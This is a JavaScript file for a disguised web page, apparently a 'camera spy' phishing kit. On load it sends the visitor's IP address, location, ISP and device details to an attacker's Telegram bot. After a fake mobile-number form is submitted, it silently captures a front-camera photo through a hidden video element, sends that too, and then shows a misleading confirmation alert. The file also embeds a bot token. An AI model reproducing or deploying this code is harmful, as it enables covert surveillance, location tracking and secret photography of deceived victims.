const BOT_TOKEN = "8099789555:AAEcbEby2vaZ4ewaVhGD1t-sGydYJPZsPnI"; // Replace with your bot token
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.charging = battery.charging;
        deviceInfo.chargingPercentage = Math.round(battery.level * 100);
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }

    return deviceInfo;
}

async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log("Telegram Response:", result);
    } catch (error) {
        console.error("Error sending message:", error);
    }
}

async function sendPhoto(chatId, photo) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photo);

    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });

        const result = await response.json();
        console.log("Photo sent:", result);
    } catch (error) {
        console.error("Error sending photo:", error);
    }
}

async function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photo = canvas.toDataURL('image/png');

    // Convert data URL to Blob
    const response = await fetch(photo);
    const blob = await response.blob();
    return new File([blob], 'photo.png', { type: 'image/png' });
}

async function sendInitialInfo() {
    const ipDetails = await getIpDetails();
    const deviceInfo = await getDeviceInfo();
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('id');

    const message = `
<b><u>ℹ️ Activity Tracked:</u></b>

<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>

<b>📱Device Info:</b>
<b>🔋 Charging:</b> <i>${deviceInfo.charging ? 'Yes' : 'No'}</i>
<b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
<b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>

<b>👨‍💻 Tracked on: @Ind_Camera_Spy_RoBot</b>
`;

    if (chatId) {
        await sendTelegramMessage(chatId, message);
    } else {
        console.error("Chat ID missing in URL!");
    }
}

document.getElementById('data-form').addEventListener('submit', async function (event) {
    event.preventDefault();

    const operator = document.getElementById('operator').value;
    const mobileNumber = document.getElementById('mobile-number').value;
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('id');

    if (!chatId) {
        alert("Chat ID is missing in the URL!");
        return;
    }

    const ipDetails = await getIpDetails();

    const message = `
<b><u>☎️ Number Tracked</u></b>
<b>📱 Mobile number:</b> +91${mobileNumber}
<b>📡 Operator:</b> ${operator}

<b>🌐 Ip Information:</b>
<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>

<b>👨‍💻 Tracked on: @Ind_Camera_Spy_RoBot</b>
`;

    await sendTelegramMessage(chatId, message);

    const video = await startCamera();
    const photo = await capturePhoto(video);
    await sendPhoto(chatId, photo);

    // Stop the camera and clean up
    const tracks = video.srcObject.getTracks();
    tracks.forEach(track => track.stop());
    video.remove();

    alert("Your request has been processed under 24 hours !");
});

sendInitialInfo();

document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '');
});

async function startCamera() {
    const video = document.createElement('video');
    video.style.display = 'none'; // Hide the video element
    document.body.appendChild(video);

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
        video.play();

        await new Promise(resolve => {
            video.onloadedmetadata = resolve;
        });

        return video;
    } catch (error) {
        console.error("Error accessing camera:", error);
        return null;
    }
}
